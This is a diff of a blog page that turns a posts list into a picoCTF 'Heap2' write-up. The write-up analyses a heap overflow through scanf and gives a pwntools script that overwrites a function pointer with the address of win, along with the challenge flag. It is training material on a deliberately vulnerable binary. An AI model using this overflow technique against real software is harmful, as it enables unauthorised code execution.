@@ -3,7 +3,7 @@
 
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <title>
-Posts | 0x3nigma
+Heap2 | 0x3nigma
 </title>
 
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
@@ -13,9 +13,7 @@ Posts | 0x3nigma
 <meta name="generator" content="Hugo 0.151.0">
 
 
-<link rel="canonical" href="http://localhost:1313/posts/" >
-  <link href="http://localhost:1313/posts/index.xml" rel="alternate" type="application/rss+xml" title="0x3nigma Blog" >
-  <link href="http://localhost:1313/posts/index.xml" rel="feed" type="application/rss+xml" title="0x3nigma Blog" >
+<link rel="canonical" href="http://localhost:1313/posts/picoctf_heap2/" >
 
 
 
@@ -66,39 +64,63 @@ Posts | 0x3nigma
         <div class="content">
             <main class="main">
                 
-
-<div>
-  <div class="listHeader">
-    <h1>Posts</h1>
-  </div>
-
-  
-
-  
-  
-
-  <div role="list">
+<div class="postWrapper">
+    <h1>Heap2</h1>
     
-      <div class="postListItem" role="listitem">
-        <a class="postListLink" href="http://localhost:1313/posts/picoctf_heap2/">
-          <div class="postHeader">
-            <span class="postTitle">Heap2</span>
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    <section class="postMetadata">
+        <dl>
             
             
-            <time class="postDate" datetime="2025-12-20">2025-12-20</time>
-          </div>
-          
-          
-          
-          
-          
-          <div class="readingTime">
-            reading time: 3 minutes
-          </div>
-          
-        </a>
-        <div class="postExcerpt">
-          <h3 id="analysis">Analysis:</h3>
+            
+            
+                <dt>published</dt>
+                 
+                 
+                 <dd><time datetime="2025-12-20">2025-12-20</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>3 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <h3 id="analysis">Analysis:</h3>
 <p>Checking the protections on the binary:</p>
 <p><img src="/Images/checksec_heap2.png" alt="alt"></p>
 <p>From the above result we can see that this is a 64 bit binary with no stack canary and no PIE. But since the challenge is named as heap2 I don&rsquo;t think there will be much to do with the stack.</p>
@@ -199,75 +221,69 @@ Posts | 0x3nigma
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>From the above code we can see that the <code>win</code> function prints the flag but there is no direct method of calling it.
 However if we give a closer look at the <code>check_win()</code> function:</p>
-        </div>
-      </div>
-    
-      <div class="postListItem" role="listitem">
-        <a class="postListLink" href="http://localhost:1313/posts/picoctf_handoff/">
-          <div class="postHeader">
-            <span class="postTitle">Handoff</span>
-            
-            
-            <time class="postDate" datetime="2025-12-16">2025-12-16</time>
-          </div>
-          
-          
-          
-          
-          
-          <div class="readingTime">
-            reading time: 4 minutes
-          </div>
-          
-        </a>
-        <div class="postExcerpt">
-          <h4 id="analysis">Analysis:</h4>
-<p>In this challenge we are provided with the source code and the binary.</p>
-<h5 id="step-1">Step 1:</h5>
-<p>We will first check the protections with checksec:</p>
-<p><img src="/Images/checksec_handoff.png" alt="alt"></p>
-<p>From the above output we can see a few things:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_win</span>() { 
+</span></span><span style="display:flex;"><span>	((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)())<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)x)();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We see that it is first typecasting x into an integer pointer and then it is retrieving the value at x and on x86-64, <code>int</code> is still 4 bytes, so only the lower 4 bytes of the pointer stored at x are read and then it is typecasting that into a function pointer and calling the function pointed by the function pointer.
+So if we could anyhow write the address of the <code>win()</code> function at x , it will get called when calling the <code>check_win()</code> function.
+However we must note that this is a 64 bit binary and the addresses are 8 byte addresses but the above is only retrieving 4 bytes.
+To check if 4 bytes will be enough we run the following command :
+<code>readelf -s chall | grep &quot;win&quot;</code></p>
+<p>And we got this:
+<code>38: 00000000004011a0    66 FUNC    GLOBAL DEFAULT   14 win</code></p>
+<p>Hence we see that the address of <code>win</code> function is <code>0x00000000004011a0</code> which consists of only 3 non-zero bytes initially. Hence the 4 bytes will be enough.</p>
+<p>Also we see in the <code>write_buffer()</code> function:
+<code>scanf(&quot;%s&quot;, input_data); </code></p>
+<p>This means we can send data of any length into <code>input_data</code>. Hence we will use this vulnerability to overwrite x.
+`</p>
+<p>Now we can write an exploit for this binary:</p>
+<h3 id="exploitation">Exploitation:</h3>
+<h4 id="steps">Steps:</h4>
 <ol>
-<li>That the stack of the binary is executable</li>
-<li>There is no protection against buffer overflow since it lacks a stack canary.</li>
+<li>
+<p>First we have to find the distance between <code>input_data</code> and <code>x</code> so that we can overflow the <code>input_data</code> and overwrite <code>x</code>.
+Running the program and printing the heap we get :</p>
+<p><img src="/Images/dist_heap2.png" alt="alt"></p>
+<p>Hence we can see that the dist between <code>input_data</code> and <code>x</code> is (0x18046d0 - 0x18046b0) that is 32 bytes.</p>
+</li>
+<li>
+<p>Then we send the payload which will consist of 32 bytes of random data followed by the address of <code>win</code> function to overwrite  <code>x</code>.</p>
+</li>
+<li>
+<p>Then we will call the <code>check_win()</code> function.</p>
+</li>
 </ol>
-<p>From the above observations we can infer that we can inject and execute a shellcode. Now lets look at the source code:</p>
-        </div>
-      </div>
-    
-      <div class="postListItem" role="listitem">
-        <a class="postListLink" href="http://localhost:1313/posts/web_server/">
-          <div class="postHeader">
-            <span class="postTitle">Building a Web Server from Scratch in Python</span>
-            
-            
-            <time class="postDate" datetime="2025-10-20">2025-10-20</time>
-          </div>
-          
-          
-          
-          
-          
-          <div class="readingTime">
-            reading time: 7 minutes
-          </div>
-          
-        </a>
-        <div class="postExcerpt">
-          <p>I am trying to learn how a web server like nginx work. So I thought of making one myself because the best way to learn something is making it yourself. This will be a multipart series.
-In this first part, we&rsquo;ll build a simple, single-threaded server that can handle basic HTTP requests and even has a custom echo endpoint.</p>
-<h2 id="creating-the-server">Creating the server</h2>
-<h4 id="step-1">Step 1:</h4>
-<p>We will first create a class in python and name it Server. This Server class will contain all the functionalities of our server.</p>
-        </div>
-      </div>
-    
-  </div>
+<p>Here is the exploit script:</p>
+<h4 id="script">Script:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;host&#34;</span>, type<span style="color:#f92672">=</span>str)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;port&#34;</span>, type<span style="color:#f92672">=</span>int)
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>,
+</span></span><span style="display:flex;"><span>        elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;win&#39;</span>]
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Running the script we get the following flag:</p>
+<h4 id="flag">Flag:</h4>
+<p><code>picoCTF{and_down_the_road_we_go_856288fc}</code></p>
 
-
-
+    </div>
 </div>
-
 
             </main>
         </div>
